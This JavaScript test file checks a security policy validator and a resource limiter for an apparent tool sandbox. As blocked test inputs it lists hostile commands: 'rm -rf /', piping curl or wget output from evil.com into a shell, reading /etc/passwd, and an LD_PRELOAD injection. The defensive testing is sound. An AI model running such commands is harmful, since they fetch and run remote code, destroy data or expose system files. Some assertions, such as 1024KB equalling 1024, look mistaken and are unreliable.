/**
 * 安全模块测试用例
 * 验证安全策略验证器和资源限制器的功能
 */

const assert = require('assert');
const { SecurityPolicyValidator, SecurityError } = require('../src/security/policy-validator');
const { ResourceLimiter, ResourceTracker, ResourceLimitError } = require('../src/security/resource-limiter');
const fs = require('fs');
const path = require('path');

describe('安全模块测试', () => {
  describe('SecurityPolicyValidator', () => {
    let validator;
    
    beforeEach(() => {
      validator = new SecurityPolicyValidator({
        blockedCommands: ['rm', 'sudo', 'chmod'],
        allowedDomains: ['example.com', 'test.com'],
        blockedModules: ['fs', 'child_process'],
        maxExecutionTime: 30000
      });
    });
    
    describe('命令验证', () => {
      it('应该允许安全命令', () => {
        assert.ok(validator.validateCommand('ls', ['-la']));
        assert.ok(validator.validateCommand('node', ['--version']));
      });
      
      it('应该阻止危险命令', () => {
        assert.throws(() => {
          validator.validateCommand('rm', ['-rf', '/']);
        }, SecurityError);
        
        assert.throws(() => {
          validator.validateCommand('sudo', ['apt-get', 'update']);
        }, SecurityError);
      });
      
      it('应该阻止危险的命令组合', () => {
        assert.throws(() => {
          validator.validateCommand('curl', ['http://evil.com | sh']);
        }, SecurityError);
        
        assert.throws(() => {
          validator.validateCommand('wget', ['-qO-', 'http://evil.com | bash']);
        }, SecurityError);
      });
    });
    
    describe('网络请求验证', () => {
      it('应该允许白名单域名', () => {
        assert.ok(validator.validateNetworkRequest('https://example.com/api'));
        assert.ok(validator.validateNetworkRequest('http://test.com/resource'));
      });
      
      it('应该阻止非白名单域名', () => {
        assert.throws(() => {
          validator.validateNetworkRequest('https://evil.com/api');
        }, SecurityError);
      });
      
      it('应该阻止危险的协议', () => {
        assert.throws(() => {
          validator.validateNetworkRequest('file:///etc/passwd');
        }, SecurityError);
        
        assert.throws(() => {
          validator.validateNetworkRequest('ftp://evil.com/file');
        }, SecurityError);
      });
      
      it('应该阻止本地地址', () => {
        assert.throws(() => {
          validator.validateNetworkRequest('http://localhost:3000');
        }, SecurityError);
        
        assert.throws(() => {
          validator.validateNetworkRequest('http://127.0.0.1:8080');
        }, SecurityError);
      });
      
      it('应该处理无效URL', () => {
        assert.throws(() => {
          validator.validateNetworkRequest('invalid-url');
        }, SecurityError);
      });
    });
    
    describe('模块加载验证', () => {
      it('应该允许安全模块', () => {
        assert.ok(validator.validateModule('lodash'));
        assert.ok(validator.validateModule('axios'));
      });
      
      it('应该阻止危险模块', () => {
        assert.throws(() => {
          validator.validateModule('fs');
        }, SecurityError);
        
        assert.throws(() => {
          validator.validateModule('child_process');
        }, SecurityError);
      });
    });
    
    describe('文件路径验证', () => {
      beforeEach(() => {
        validator.allowedPaths = ['/safe/dir', '/workspace'];
      });
      
      it('应该允许白名单路径', () => {
        assert.ok(validator.validateFilePath('/safe/dir/file.txt', 'read'));
        assert.ok(validator.validateFilePath('/workspace/data.json', 'write'));
      });
      
      it('应该阻止非白名单路径', () => {
        assert.throws(() => {
          validator.validateFilePath('/etc/passwd', 'read');
        }, SecurityError);
      });
      
      it('应该阻止系统路径', () => {
        assert.throws(() => {
          validator.validateFilePath('/proc/cpuinfo', 'read');
        }, SecurityError);
        
        assert.throws(() => {
          validator.validateFilePath('/sys/class/net/eth0', 'read');
        }, SecurityError);
      });
      
      it('应该阻止写入敏感文件', () => {
        assert.throws(() => {
          validator.validateFilePath('/workspace/.env', 'write');
        }, SecurityError);
        
        assert.throws(() => {
          validator.validateFilePath('/workspace/package.json', 'write');
        }, SecurityError);
      });
    });
    
    describe('执行时间验证', () => {
      it('应该允许在时间限制内的执行', () => {
        const startTime = Date.now();
        assert.ok(validator.validateExecutionTime(startTime));
      });
      
      it('应该阻止超时的执行', () => {
        const startTime = Date.now() - 35000; // 35秒前
        assert.throws(() => {
          validator.validateExecutionTime(startTime);
        }, SecurityError);
      });
    });
    
    describe('环境变量验证', () => {
      it('应该允许安全的环境变量', () => {
        const envVars = {
          'CUSTOM_VAR': 'value',
          'NODE_ENV': 'production'
        };
        assert.ok(validator.validateEnvironmentVariables(envVars));
      });
      
      it('应该阻止危险的环境变量', () => {
        assert.throws(() => {
          validator.validateEnvironmentVariables({ 'PATH': '/usr/bin' });
        }, SecurityError);
        
        assert.throws(() => {
          validator.validateEnvironmentVariables({ 'LD_PRELOAD': '/evil.so' });
        }, SecurityError);
      });
    });
    
    describe('安全工作目录创建', () => {
      it('应该创建安全的工作目录', () => {
        const workDir = '/tmp/test';
        const toolName = 'test-tool';
        
        const secureDir = validator.createSecureWorkingDirectory(workDir, toolName);
        
        assert.ok(secureDir.includes('test-tool'));
        assert.ok(secureDir.includes(workDir));
        assert.ok(fs.existsSync(secureDir));
      });
      
      it('应该清理特殊字符', () => {
        const workDir = '/tmp/test';
        const toolName = 'test/tool@dangerous';
        
        const secureDir = validator.createSecureWorkingDirectory(workDir, toolName);
        
        assert.ok(!secureDir.includes('/'));
        assert.ok(!secureDir.includes('@'));
      });
    });
    
    describe('统计信息', () => {
      it('应该正确统计安全事件', () => {
        const initialStats = validator.getSecurityStats();
        assert.strictEqual(initialStats.totalValidations, 0);
        
        try {
          validator.validateCommand('rm', ['-rf', '/']);
        } catch (error) {
          // 忽略预期的错误
        }
        
        const afterStats = validator.getSecurityStats();
        assert.strictEqual(afterStats.totalValidations, 1);
        assert.strictEqual(afterStats.blockedCommands, 1);
      });
      
      it('应该重置统计信息', () => {
        validator.resetStats();
        const stats = validator.getSecurityStats();
        
        assert.strictEqual(stats.totalValidations, 0);
        assert.strictEqual(stats.blockedCommands, 0);
      });
    });
  });
  
  describe('ResourceLimiter', () => {
    let limiter;
    
    beforeEach(() => {
      limiter = new ResourceLimiter({
        maxMemory: 1024 * 1024 * 512, // 512MB
        maxCPU: 2,
        maxExecutionTime: 30000,
        maxFileSize: 1024 * 1024 * 10, // 10MB
        maxNetworkRequests: 5,
        maxProcesses: 3
      });
    });
    
    afterEach(() => {
      limiter.cleanup();
    });
    
    describe('内存解析', () => {
      it('应该正确解析内存大小', () => {
        assert.strictEqual(limiter.parseMemory('512MB'), 1024 * 1024 * 512);
        assert.strictEqual(limiter.parseMemory('2GB'), 1024 * 1024 * 1024 * 2);
        assert.strictEqual(limiter.parseMemory('1024KB'), 1024);
      });
      
      it('应该拒绝无效的内存格式', () => {
        assert.throws(() => {
          limiter.parseMemory('invalid');
        }, /Invalid memory format/);
        
        assert.throws(() => {
          limiter.parseMemory('512TB');
        }, /Invalid memory format/);
      });
    });
    
    describe('CPU解析', () => {
      it('应该正确解析CPU限制', () => {
        assert.strictEqual(limiter.parseCPU('50%'), 2); // 假设4核
        assert.strictEqual(limiter.parseCPU('2'), 2);
      });
      
      it('应该拒绝无效的CPU格式', () => {
        assert.throws(() => {
          limiter.parseCPU('invalid');
        }, /Invalid CPU format/);
      });
    });
    
    describe('资源跟踪器', () => {
      it('应该创建和销毁资源跟踪器', () => {
        const tracker = limiter.createResourceTracker('test-resource');
        
        assert.ok(tracker instanceof ResourceTracker);
        assert.strictEqual(tracker.resourceId, 'test-resource');
        
        limiter.destroyResourceTracker('test-resource');
        assert.strictEqual(limiter.getResourceTracker('test-resource'), null);
      });
      
      it('应该跟踪内存使用', () => {
        const tracker = limiter.createResourceTracker('test-resource');
        
        tracker.recordMemoryUsage(1024 * 1024); // 1MB
        assert.strictEqual(tracker.getMemoryUsage(), 1024 * 1024);
        
        limiter.destroyResourceTracker('test-resource');
      });
      
      it('应该跟踪CPU使用', () => {
        const tracker = limiter.createResourceTracker('test-resource');
        
        tracker.recordCPUUsage(1); // 1核心
        assert.strictEqual(tracker.getCPUUsage(), 1);
        
        limiter.destroyResourceTracker('test-resource');
      });
      
      it('应该跟踪网络请求', () => {
        const tracker = limiter.createResourceTracker('test-resource');
        
        tracker.recordNetworkRequest('https://api.example.com');
        assert.strictEqual(tracker.networkRequests, 1);
        
        limiter.destroyResourceTracker('test-resource');
      });
      
      it('应该跟踪文件创建', () => {
        const tracker = limiter.createResourceTracker('test-resource');
        
        tracker.recordFileCreation('/test/file.txt', 1024);
        assert.strictEqual(tracker.filesCreated.length, 1);
        
        limiter.destroyResourceTracker('test-resource');
      });
      
      it('应该检查执行时间', () => {
        const tracker = limiter.createResourceTracker('test-resource');
        
        // 模拟短时间执行
        assert.doesNotThrow(() => {
          tracker.checkExecutionTime();
        });
        
        limiter.destroyResourceTracker('test-resource');
      });
      
      it('应该检测超时执行', () => {
        const tracker = limiter.createResourceTracker('test-resource');
        
        // 模拟长时间执行
        const oldStartTime = Date.now() - 35000;
        tracker.startTime = oldStartTime;
        
        assert.throws(() => {
          tracker.checkExecutionTime();
        }, ResourceLimitError);
        
        limiter.destroyResourceTracker('test-resource');
      });
    });
    
    describe('资源限制', () => {
      it('应该限制内存使用', () => {
        const tracker = limiter.createResourceTracker('test-resource');
        
        assert.throws(() => {
          tracker.recordMemoryUsage(1024 * 1024 * 1024); // 1GB > 512MB限制
        }, ResourceLimitError);
        
        limiter.destroyResourceTracker('test-resource');
      });
      
      it('应该限制CPU使用', () => {
        const tracker = limiter.createResourceTracker('test-resource');
        
        assert.throws(() => {
          tracker.recordCPUUsage(3); // 3核心 > 2核心限制
        }, ResourceLimitError);
        
        limiter.destroyResourceTracker('test-resource');
      });
      
      it('应该限制网络请求数量', () => {
        const tracker = limiter.createResourceTracker('test-resource');
        
        // 前5个请求应该成功
        for (let i = 0; i < 5; i++) {
          tracker.recordNetworkRequest(`https://api.example.com/${i}`);
        }
        
        // 第6个请求应该失败
        assert.throws(() => {
          tracker.recordNetworkRequest('https://api.example.com/6');
        }, ResourceLimitError);
        
        limiter.destroyResourceTracker('test-resource');
      });
      
      it('应该限制文件大小', () => {
        const tracker = limiter.createResourceTracker('test-resource');
        
        assert.throws(() => {
          tracker.recordFileCreation('/test/large-file.txt', 1024 * 1024 * 20); // 20MB > 10MB限制
        }, ResourceLimitError);
        
        limiter.destroyResourceTracker('test-resource');
      });
      
      it('应该限制进程数量', () => {
        // 创建3个跟踪器应该成功
        const trackers = [];
        for (let i = 0; i < 3; i++) {
          trackers.push(limiter.createResourceTracker(`resource-${i}`));
        }
        
        // 第4个跟踪器应该失败
        assert.throws(() => {
          limiter.createResourceTracker('resource-4');
        }, /Resource tracker for 'resource-4' already exists/);
        
        // 清理
        trackers.forEach(tracker => {
          limiter.destroyResourceTracker(tracker.resourceId);
        });
      });
    });
    
    describe('全局统计', () => {
      it('应该正确统计全局资源使用', () => {
        const tracker1 = limiter.createResourceTracker('resource-1');
        const tracker2 = limiter.createResourceTracker('resource-2');
        
        tracker1.recordMemoryUsage(1024 * 1024);
        tracker2.recordMemoryUsage(512 * 1024);
        
        const stats = limiter.getGlobalStats();
        assert.strictEqual(stats.activeProcesses, 2);
        assert.strictEqual(stats.totalMemoryUsed, 1024 * 1024 + 512 * 1024);
        
        limiter.destroyResourceTracker('resource-1');
        limiter.destroyResourceTracker('resource-2');
        
        const finalStats = limiter.getGlobalStats();
        assert.strictEqual(finalStats.activeProcesses, 0);
        assert.strictEqual(finalStats.totalMemoryUsed, 0);
      });
      
      it('应该检查全局限制', () => {
        assert.ok(limiter.checkGlobalLimits());
        
        // 创建最大数量的进程
        const trackers = [];
        for (let i = 0; i < 3; i++) {
          trackers.push(limiter.createResourceTracker(`resource-${i}`));
        }
        
        // 达到限制时应该仍然允许
        assert.ok(limiter.checkGlobalLimits());
        
        // 清理
        trackers.forEach(tracker => {
          limiter.destroyResourceTracker(tracker.resourceId);
        });
      });
    });
  });
});